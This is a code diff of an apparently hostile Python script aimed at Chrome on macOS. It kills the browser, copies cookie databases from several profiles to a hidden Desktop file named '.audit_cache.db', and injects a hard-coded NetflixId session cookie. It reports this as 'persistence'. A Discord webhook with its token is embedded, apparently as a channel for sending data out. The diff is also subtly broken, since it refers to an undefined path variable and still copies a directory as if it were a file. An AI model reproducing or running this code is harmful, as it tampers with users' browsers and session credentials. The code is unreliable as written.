@@ -13,7 +13,8 @@ from Cryptodome.Protocol.KDF import PBKDF2
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
 NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"
 
-CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
+CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome")
+PROFILES = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
 TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db")
 
 def kill_chrome():
@@ -44,8 +45,14 @@ def execute_strike():
         return
 
     shutil.copyfile(CHROME_PATH, TEMP_DB)
-    conn = sqlite3.connect(TEMP_DB)
-    cursor = conn.cursor()
+    for profile in PROFILES:
+        chrome_db = os.path.join(BASE_CHROME_PATH, profile, "Cookies")
+        if not os.path.exists(chrome_db): continue
+        
+        print(f"[*] Scanning Profile: {profile}")
+        shutil.copyfile(chrome_db, TEMP_DB)
+        conn = sqlite3.connect(TEMP_DB)
+        cursor = conn.cursor()
     
     try:
         key = get_encryption_key()
@@ -84,13 +91,9 @@ def execute_strike():
             now_ts = int((time.time() + 11644473600) * 1000000)
             expiry = 13350000000000000 
             
-            sql = """
-                INSERT OR REPLACE INTO cookies 
-                (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, top_frame_site_key, is_same_party) 
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            """
-            params = (now_ts, '.netflix.com', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1, '', 0)
-            
+            sql = "INSERT OR REPLACE INTO cookies (creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+            params = (now_ts, '.netflix.com', '', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
+
             cursor.execute(sql, params)
             conn.commit()
             print("[+] Persistence injected successfully.")
